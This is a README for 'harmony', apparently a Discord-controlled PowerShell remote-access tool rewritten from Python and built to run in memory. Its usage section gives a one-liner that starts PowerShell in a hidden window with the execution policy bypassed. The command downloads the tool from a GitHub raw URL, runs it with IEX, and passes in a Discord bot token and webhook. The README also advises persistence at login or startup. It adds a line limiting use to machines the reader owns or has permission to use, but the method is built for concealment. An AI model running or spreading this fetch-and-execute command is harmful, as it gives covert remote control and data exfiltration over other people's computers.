# Currently all functions seem to work with 1 computer connected. Multiple is currently untested.

A PowerShell rewrite and continuation of the original Python code, designed to run directly in memory for greater efficiency. The PowerShell script is approximately 4 KB, significantly smaller than the ~20 MB executable generated by Python Nuitka*. The PowerShell version is also easier to update.

*While the Python code itself is around 3.5 KB, this doesnâ€™t account for the necessary packages, nor does it consider that Python is often not pre-installed on Windows. Nuitka would need to be used to compile the code into an executable for universal compatibility across all supported Windows systems.

### **Usage Instructions:**

To execute the script, run the following command (preferably with persistence for automatic execution, such as a batch file or similar method at login or startup) on the remote computer you own or have permission to use, ensuring you replace the placeholders with your own Discord Bot Token, Server ID, and Webhook URL:

```powershell
cmd /c start /min "" powershell -W Hidden -EP Bypass -C "$TOKEN='<YOUR_BOT_TOKEN>';$serverID='<YOUR_SERVER_ID>';$whURL='<YOUR_WEBHOOK_URL>';IEX(IWR 'https://raw.githubusercontent.com/olivia1246/harmony/refs/heads/powershell/harmony.ps1' -UseBasicParsing);exit"
```
